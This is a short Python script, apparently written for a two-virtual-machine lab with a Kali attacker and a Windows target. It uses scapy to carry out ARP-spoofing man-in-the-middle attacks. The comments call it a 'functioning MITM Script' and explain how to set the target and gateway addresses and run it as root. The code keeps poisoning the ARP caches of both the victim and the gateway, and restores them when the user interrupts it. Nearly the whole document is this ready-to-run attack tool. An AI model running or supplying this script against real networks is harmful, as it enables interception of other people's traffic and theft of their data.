#Welcome to our functioning MITM Script. 
#Please read the comments and change the targetIP, spoofIP, sourceMAC, destinationMac, and gatewayIP to match your two VM's
#After that please save and run in command prompt with "Sudo Python3 'File Destination'"
#CTRL + C Stops the MITM Attack


import scapy.all as scapy
import time
import argparse
import sys

#Keep quotations around all the inputs

#IPv4 Address of Windows Machine
targetIP = "192.168.83.130" 

#Default Gateway of Windows Machine
spoofIP = "192.168.83.2" 

#ether of Kali eth0
sourceMAC = "00:0c:29:c4:64:ac" 

#Physical Address of Windows Machine
destinationMac = "00:0C:29:17:90:6B" 

#Same as Spoof ID (Default Gateway of Windows Machine)
gatewayIP = "192.168.83.2" 




def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=destinationMac,psrc=sourceIP,hwsrc=sourceMAC)
    scapy.send(packet, count=4,verbose=False)


packets = 0
try:
    while True:
        spoofer(targetIP,gatewayIP)
        spoofer(gatewayIP,targetIP)
        print("\r[+] Sent packets "+ str(packets)),
        sys.stdout.flush()
        packets +=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing. Returning to normal state..")
    restore(targetIP,gatewayIP)
    restore(gatewayIP,targetIP)